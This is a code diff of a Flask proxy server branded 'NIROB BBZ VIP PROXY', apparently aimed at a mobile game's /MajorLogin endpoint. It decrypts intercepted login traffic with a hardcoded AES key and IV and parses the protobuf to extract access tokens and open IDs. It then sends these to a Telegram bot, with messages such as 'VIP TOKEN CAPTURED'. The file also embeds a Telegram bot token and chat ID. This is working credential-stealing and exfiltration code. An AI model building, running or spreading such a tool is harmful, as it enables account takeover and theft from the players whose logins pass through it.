@@ -6,21 +6,23 @@ from urllib.parse import urlparse, parse_qs
 import httpx
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+from protobuf_decoder.protobuf_decoder import Parser, FixedBitsValue
 import time
 import random
 import os
 import logging
 import base64
 import hashlib
+import re
 
 # Flask App initialization
 app = Flask(__name__)
 
-# Disable logging for cleaner output
+# Disable logging
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
-# ANSI Colors for Terminal Styling
+# ANSI Colors
 G = "\033[92m"
 Y = "\033[93m"
 R = "\033[91m"
@@ -28,9 +30,6 @@ B = "\033[94m"
 W = "\033[0m"
 C = "\033[96m"
 M = "\033[95m"
-
-def rgb_color(r, g, b):
-    return f"\033[38;2;{r};{g};{b}m"
 
 def rainbow_text(text):
     colors = [
@@ -47,7 +46,7 @@ def animated_banner():
     banner = f"""
 {G}╔══════════════════════════════════════════╗
 {Y}║          NIROB BBZ - VIP PROXY           ║
-{C}║          SECURE SERVER v2.0              ║
+{C}║          PROTOSECURE v3.0                ║
 {M}╚══════════════════════════════════════════╝{W}
     """
     print(banner)
@@ -65,122 +64,169 @@ def get_local_ip():
 LOCAL_IP = get_local_ip()
 PORT = int(os.environ.get('PORT', 5000))
 
-# ================= CRYPTO CONFIG =================
-# Try different key variations
-KEY_VARIANTS = [
-    b'Yg&tc%DEuh6%Zc^8',  # Original
-    b'Yg&tc%DEuh6%Zc^8',  # Same
-    b'6oyZDr22E3ychjM%',  # Reverse
-    b'Yg&tc%DEuh6%Zc^8',  # Default
-]
-
-IV_VARIANTS = [
-    b'6oyZDr22E3ychjM%',  # Original
-    b'Yg&tc%DEuh6%Zc^8',  # Reverse
-    b'0000000000000000',  # Null IV
-    b'6oyZDr22E3ychjM%',  # Default
-]
-
 # ================= TELEGRAM CONFIG =================
 BOT_TOKEN = "8859282308:AAFPrC5ooQOGxacZdnbB-ZjAQ5szGeLyf-Y"
 CHAT_ID = "-1004291576288"
+# ===================================================
 
-# ================= DECRYPTION FUNCTIONS =================
-
-def decrypt_aes_cbc(encrypted_data, key, iv):
-    """Try AES-CBC decryption with given key and IV"""
+# ================= CRYPTO FUNCTIONS =================
+def decrypt_api(cipher_text):
+    """Decrypt API response using AES-CBC"""
     try:
+        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
+        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
         cipher = AES.new(key, AES.MODE_CBC, iv)
-        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
-        return decrypted.decode('utf-8', errors='ignore')
+        plain_text = unpad(cipher.decrypt(bytes.fromhex(cipher_text)), AES.block_size)
+        return plain_text.hex()
     except Exception as e:
+        print(f"{R}[!] Decrypt error: {e}{W}")
         return None
 
-def decrypt_api(encrypted_hex):
-    """Decrypt API response with multiple key/IV combinations"""
+def encrypt_api(plain_text):
+    """Encrypt data using AES-CBC"""
     try:
-        # Convert hex to bytes
-        encrypted_bytes = bytes.fromhex(encrypted_hex)
-        print(f"{Y}[DEBUG] Encrypted length: {len(encrypted_bytes)} bytes{W}")
-        
-        # Try all key/IV combinations
-        for key in KEY_VARIANTS:
-            for iv in IV_VARIANTS:
-                try:
-                    result = decrypt_aes_cbc(encrypted_bytes, key, iv)
-                    if result and len(result) > 10:  # Valid result
-                        print(f"{G}[DEBUG] Success with key: {key[:8]}... iv: {iv[:8]}...{W}")
-                        print(f"{G}[DEBUG] Decrypted: {result[:100]}...{W}")
-                        return result
-                except:
-                    continue
-        
-        print(f"{R}[DEBUG] All decryption attempts failed{W}")
-        return "{}"
-        
+        plain_text = bytes.fromhex(plain_text)
+        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
+        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        cipher_text = cipher.encrypt(pad(plain_text, AES.block_size))
+        return cipher_text.hex()
     except Exception as e:
-        print(f"{R}[DEBUG] Decryption error: {e}{W}")
+        print(f"{R}[!] Encrypt error: {e}{W}")
+        return None
+
+# ================= PROTOBUF FUNCTIONS =================
+def parse_results(parsed_results):
+    """Parse protobuf results"""
+    result_dict = {}
+    for result in parsed_results:
+        if result.field not in result_dict:
+            result_dict[result.field] = []
+        if result.wire_type in ("varint", "string", "bytes"):
+            field_data = result.data
+        elif result.wire_type == "length_delimited":
+            field_data = parse_results(result.data.results)
+        else:
+            field_data = result.data
+        result_dict[result.field].append(field_data)
+    return {k: v[0] if len(v) == 1 else v for k, v in result_dict.items()}
+
+def make_serializable(obj):
+    """Convert protobuf objects to serializable format"""
+    if isinstance(obj, (str, int, float, bool)) or obj is None:
+        return obj
+    if isinstance(obj, (bytes, bytearray)):
+        return obj.hex()
+    if isinstance(obj, FixedBitsValue):
+        if hasattr(obj, "value"):
+            return obj.value
+        elif hasattr(obj, "data"):
+            return obj.data
+        else:
+            return str(obj)
+    if isinstance(obj, dict):
+        return {k: make_serializable(v) for k, v in obj.items()}
+    if isinstance(obj, (list, tuple)):
+        return [make_serializable(v) for v in obj]
+    return str(obj)
+
+def get_available_room(_text):
+    """Parse protobuf data and extract fields"""
+    try:
+        parsed_results = Parser().parse(_text)
+        parsed_results_dict = parse_results(parsed_results)
+        clean = make_serializable(parsed_results_dict)
+        return json.dumps(clean)
+    except Exception as e:
+        print(f"{R}[!] Protobuf parse error: {e}{W}")
         return "{}"
 
-def get_available_room(decrypted_data):
-    """Process decrypted data with multiple parsing attempts"""
+def proto_json(hex_string):
+    """Convert protobuf hex to JSON"""
     try:
-        # Try parsing as JSON
-        data = json.loads(decrypted_data)
-        return data
-    except json.JSONDecodeError:
-        # Try parsing as URL encoded
-        try:
-            from urllib.parse import parse_qs
-            parsed = parse_qs(decrypted_data)
-            if parsed:
-                return parsed
-        except:
-            pass
-        
-        # Try extracting with regex
-        try:
-            import re
-            token_match = re.search(r'"?29"?\s*[:=]\s*"?([^"&\s,}]+)"?', decrypted_data)
-            openid_match = re.search(r'"?22"?\s*[:=]\s*"?([^"&\s,}]+)"?', decrypted_data)
-            
-            if token_match and openid_match:
-                return {
-                    "29": token_match.group(1),
-                    "22": openid_match.group(1)
-                }
-        except:
-            pass
-        
-        print(f"{Y}[DEBUG] Could not parse: {decrypted_data[:200]}{W}")
-        return {}
+        parsed = Parser().parse(hex_string)
+        parsed_dict = parse_results(parsed)
+        clean = make_serializable(parsed_dict)
+        return json.dumps(clean, ensure_ascii=False, indent=1)
+    except Exception as e:
+        print(f"{R}[!] Proto to JSON error: {e}{W}")
+        return "{}"
 
-def extract_from_base64(encrypted_text):
-    """Try base64 decoding"""
+def extract_fields_from_protobuf(hex_data):
+    """Extract specific fields from protobuf data"""
     try:
-        decoded = base64.b64decode(encrypted_text)
-        return decoded.hex()
-    except:
-        return encrypted_text
+        # First decrypt if needed
+        decrypted = decrypt_api(hex_data)
+        if decrypted:
+            # Parse protobuf
+            json_data = proto_json(decrypted)
+            data = json.loads(json_data)
+            
+            # Try to find token and open_id
+            access_token = None
+            open_id = None
+            
+            # Search for token (field 29 or 22)
+            if '29' in data:
+                if isinstance(data['29'], dict):
+                    access_token = data['29'].get('data', str(data['29']))
+                else:
+                    access_token = str(data['29'])
+            
+            if '22' in data:
+                if isinstance(data['22'], dict):
+                    open_id = data['22'].get('data', str(data['22']))
+                else:
+                    open_id = str(data['22'])
+            
+            # Search recursively
+            if not access_token or not open_id:
+                def search_fields(obj, depth=0):
+                    if depth > 10:
+                        return
+                    if isinstance(obj, dict):
+                        for key, value in obj.items():
+                            if key in ['29', '22']:
+                                if key == '29' and not access_token:
+                                    access_token = str(value)
+                                if key == '22' and not open_id:
+                                    open_id = str(value)
+                            search_fields(value, depth + 1)
+                    elif isinstance(obj, list):
+                        for item in obj:
+                            search_fields(item, depth + 1)
+                
+                search_fields(data)
+            
+            return access_token, open_id
+            
+    except Exception as e:
+        print(f"{R}[!] Extract fields error: {e}{W}")
+    
+    return None, None
 
 # ================= TELEGRAM SENDER =================
 def send_to_telegram(access_token, open_id):
-    """Send captured credentials to Telegram group"""
-    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
-        print(f"{Y}[!] Skipping Telegram send - invalid credentials{W}")
+    """Send captured credentials to Telegram"""
+    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT" or not access_token or not open_id:
+        print(f"{Y}[!] Skipping Telegram - invalid credentials{W}")
         return False
     
     try:
-        message = f"""👑 New Token!
+        message = f"""🔥 VIP TOKEN CAPTURED! 🔥
 
-🔑 Token:
-{access_token}
+🔑 Access Token:
+<code>{access_token}</code>
 
 🆔 Open ID:
-{open_id}
+<code>{open_id}</code>
 
-👑 Powered by: NIROB BBZ
-⚡ Status: Successful Intercept
+👑 System: NIROB BBZ PROXY
+⚡ Status: SUCCESS
+📱 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
+
+───────────────────
+🤖 Bot: @GHOST_XAPIS
 """
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {
@@ -193,7 +239,7 @@ def send_to_telegram(access_token, open_id):
             print(f"{G}[✔] Token sent to Telegram!{W}")
             return True
         else:
-            print(f"{R}[!] Failed to send: {response.text}{W}")
+            print(f"{R}[!] Telegram error: {response.text}{W}")
             return False
     except Exception as e:
         print(f"{R}[!] Telegram send error: {e}{W}")
@@ -203,8 +249,7 @@ def send_to_telegram(access_token, open_id):
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
 def proxy_handler(path):
-    """Main proxy handler for all requests"""
-    
+    """Main proxy handler"""
     full_path = f"/{path}" if path else "/"
     parsed_path = urlparse(full_path)
     path = parsed_path.path
@@ -256,93 +301,122 @@ def handle_ver_php(parsed_path):
         return Response(json.dumps({"error": str(e)}), status=500, mimetype='application/json')
 
 def handle_major_login():
-    """Handle /MajorLogin requests - VIP Trap"""
+    """Handle /MajorLogin requests - Extract credentials"""
     print(f"\n{rainbow_text('[+] TARGET HIT! /MajorLogin captured!')}{W}")
     
     # Get request body
     pyl = request.get_data()
-    print(f"{Y}[DEBUG] Received data length: {len(pyl)} bytes{W}")
-    print(f"{Y}[DEBUG] First 50 bytes: {pyl[:50].hex()}{W}")
+    print(f"{Y}[DEBUG] Received {len(pyl)} bytes{W}")
     
-    # Try to parse as JSON first
+    # Try different formats
+    access_token = "FAILED_TO_EXTRACT"
+    open_id = "FAILED_TO_EXTRACT"
+    
+    # Method 1: Try JSON
     try:
         json_data = json.loads(pyl)
-        print(f"{C}[DEBUG] Request is JSON: {json_data.keys()}{W}")
-        # Try to extract token from JSON
+        print(f"{C}[DEBUG] JSON detected{W}")
         access_token = json_data.get('access_token') or json_data.get('token') or json_data.get('29', 'FAILED_TO_EXTRACT')
         open_id = json_data.get('open_id') or json_data.get('user_id') or json_data.get('22', 'FAILED_TO_EXTRACT')
-        
         if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
-            print(f"{G}[✔] Extracted from JSON directly!{W}")
-            return send_response_with_credentials(access_token, open_id)
+            print(f"{G}[✔] Extracted from JSON{W}")
     except:
         pass
     
-    # Try hex decryption
-    try:
-        hex_data = pyl.hex()
-        print(f"{Y}[DEBUG] Hex length: {len(hex_data)}{W}")
-        
-        # Try to decrypt
-        decrypted = decrypt_api(hex_data)
-        print(f"{C}[DEBUG] Decrypted: {decrypted[:200]}{W}")
-        
-        # Parse decrypted data
-        x7m_data = get_available_room(decrypted)
-        print(f"{C}[DEBUG] Parsed data keys: {x7m_data.keys() if isinstance(x7m_data, dict) else 'Not dict'}{W}")
-        
-        # Try different keys
-        access_token = x7m_data.get("29") or x7m_data.get("access_token") or x7m_data.get("token") or "FAILED_TO_EXTRACT"
-        open_id = x7m_data.get("22") or x7m_data.get("open_id") or x7m_data.get("user_id") or "FAILED_TO_EXTRACT"
-        
-        # If still failed, try to find any token-like data
-        if access_token == "FAILED_TO_EXTRACT" and isinstance(x7m_data, dict):
-            for key, value in x7m_data.items():
-                if isinstance(value, str) and len(value) > 20 and '.' in value:
-                    access_token = value
-                    print(f"{G}[DEBUG] Found token-like value in key: {key}{W}")
-                    break
-        
-        if open_id == "FAILED_TO_EXTRACT" and isinstance(x7m_data, dict):
-            for key, value in x7m_data.items():
-                if isinstance(value, str) and len(value) > 5 and value.isdigit():
-                    open_id = value
-                    print(f"{G}[DEBUG] Found ID-like value in key: {key}{W}")
-                    break
+    # Method 2: Try Hex + Protobuf
+    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
+        try:
+            hex_data = pyl.hex()
+            print(f"{Y}[DEBUG] Trying hex decode...{W}")
+            
+            # Try direct protobuf parse
+            json_str = proto_json(hex_data)
+            if json_str and json_str != "{}":
+                data = json.loads(json_str)
+                print(f"{C}[DEBUG] Protobuf data: {json_str[:200]}...{W}")
+                
+                # Extract fields
+                if '29' in data:
+                    access_token = str(data['29'])
+                if '22' in data:
+                    open_id = str(data['22'])
+                
+                # Search nested
+                if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
+                    def search_nested(obj):
+                        nonlocal access_token, open_id
+                        if isinstance(obj, dict):
+                            for key, value in obj.items():
+                                if str(key) == '29' and access_token == "FAILED_TO_EXTRACT":
+                                    access_token = str(value)
+                                if str(key) == '22' and open_id == "FAILED_TO_EXTRACT":
+                                    open_id = str(value)
+                                search_nested(value)
+                        elif isinstance(obj, list):
+                            for item in obj:
+                                search_nested(item)
                     
-    except Exception as e:
-        print(f"{R}[!] Processing error: {e}{W}")
-        access_token, open_id = "FAILED_TO_EXTRACT", "FAILED_TO_EXTRACT"
+                    search_nested(data)
+                
+                if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
+                    print(f"{G}[✔] Extracted from Protobuf{W}")
+        except Exception as e:
+            print(f"{R}[!] Protobuf parse error: {e}{W}")
     
-    return send_response_with_credentials(access_token, open_id)
-
-def send_response_with_credentials(access_token, open_id):
-    """Send response with credentials"""
+    # Method 3: Try decrypt + protobuf
+    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
+        try:
+            hex_data = pyl.hex()
+            decrypted = decrypt_api(hex_data)
+            if decrypted:
+                print(f"{C}[DEBUG] Decrypted: {decrypted[:100]}...{W}")
+                json_str = proto_json(decrypted)
+                if json_str and json_str != "{}":
+                    data = json.loads(json_str)
+                    if '29' in data:
+                        access_token = str(data['29'])
+                    if '22' in data:
+                        open_id = str(data['22'])
+                    print(f"{G}[✔] Extracted from Decrypted Protobuf{W}")
+        except Exception as e:
+            print(f"{R}[!] Decrypt+Protobuf error: {e}{W}")
     
-    print(f"{Y}[*] Extracted Credentials:{W}")
-    print(f"{G}Access Token: {access_token}{W}")
-    print(f"{G}Open ID: {open_id}{W}")
+    # Method 4: Try raw string extraction
+    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
+        try:
+            text = pyl.decode('utf-8', errors='ignore')
+            # Search for patterns
+            token_pattern = r'(?:29|access_token|token)[:=]\s*["\']?([^"\'&\s,}]+)["\']?'
+            id_pattern = r'(?:22|open_id|user_id)[:=]\s*["\']?([^"\'&\s,}]+)["\']?'
+            
+            token_match = re.search(token_pattern, text, re.IGNORECASE)
+            id_match = re.search(id_pattern, text, re.IGNORECASE)
+            
+            if token_match:
+                access_token = token_match.group(1)
+            if id_match:
+                open_id = id_match.group(1)
+            
+            if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
+                print(f"{G}[✔] Extracted from Raw Text{W}")
+        except:
+            pass
     
-    # Display credentials with colors
-    print(f"\n{C}{'═' * 60}{W}")
-    print(f"{rainbow_text('🔥 VIP ACCOUNT CAPTURED 🔥')}")
-    print(f"{C}{'═' * 60}{W}")
-    print(f"\n{Y}🔑 {C}Access Token:{W}")
-    print(f"  {access_token}")
-    print(f"\n{Y}🆔 {C}Open ID:{W}")
-    print(f"  {open_id}")
-    print(f"\n{C}{'═' * 60}{W}")
-    print(f"{rainbow_text('👑 Powered by: NIROB BBZ')}")
-    print(f"{rainbow_text('⚡ Status: Successful Intercept')}")
-    print(f"{C}{'═' * 60}{W}\n")
+    # Display results
+    print(f"\n{Y}════════════════════════════════════════════{W}")
+    print(f"{rainbow_text('🔥 CREDENTIALS EXTRACTED 🔥')}")
+    print(f"{Y}════════════════════════════════════════════{W}")
+    print(f"{G}🔑 Access Token: {access_token}{W}")
+    print(f"{C}🆔 Open ID: {open_id}{W}")
+    print(f"{Y}════════════════════════════════════════════{W}\n")
     
-    # Send to Telegram if valid
+    # Send to Telegram
     if access_token != "FAILED_TO_EXTRACT" and open_id != "FAILED_TO_EXTRACT":
         send_to_telegram(access_token, open_id)
     else:
-        print(f"{Y}[!] Credentials invalid, not sending to Telegram{W}")
+        print(f"{R}[!] Could not extract valid credentials{W}")
     
-    # Response payload
+    # Response
     response_payload = f"""[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘
 
 [FF0000]Access Token => [00FF00]{access_token} [FF0000]| Open ID => [00FF00]{open_id}
@@ -361,9 +435,10 @@ def health_check():
     return jsonify({
         "status": "ok",
         "server": "NIROB BBZ - VIP PROXY",
-        "version": "2.0",
+        "version": "3.0",
         "port": PORT,
-        "local_ip": LOCAL_IP
+        "local_ip": LOCAL_IP,
+        "telegram": bool(BOT_TOKEN and CHAT_ID)
     })
 
 @app.route('/status')
@@ -374,13 +449,23 @@ def status():
         "telegram_configured": bool(BOT_TOKEN and CHAT_ID)
     })
 
-# ================= RUN FUNCTION =================
+@app.route('/test')
+def test():
+    """Test endpoint"""
+    return jsonify({
+        "status": "ok",
+        "message": "Server is working!",
+        "timestamp": time.time()
+    })
+
+# ================= RUN =================
 if __name__ == '__main__':
     animated_banner()
     print(f"{G}[✔] Status      : {W}{Y}Running Successfully{W}")
     print(f"{G}[✔] Port        : {W}{Y}{PORT}{W}")
-    print(f"{G}[✔] Local Proxy : {W}{B}http://127.0.0.1:{PORT}/{W}")
-    print(f"{G}[✔] Network IP  : {W}{B}http://{LOCAL_IP}:{PORT}/{W}")
+    print(f"{G}[✔] Local URL   : {W}{B}http://127.0.0.1:{PORT}/{W}")
+    print(f"{G}[✔] Network URL : {W}{B}http://{LOCAL_IP}:{PORT}/{W}")
+    print(f"{G}[✔] Telegram    : {W}{C}{'Connected' if BOT_TOKEN and CHAT_ID else 'Not Configured'}{W}")
     print(f"{rainbow_text('──────────────────────────────────────────')}")
-    print(f"{Y}[*] Waiting for target requests...{W}\n")
+    print(f"{Y}[*] Waiting for targets...{W}\n")
     app.run(host='0.0.0.0', port=PORT, debug=False)
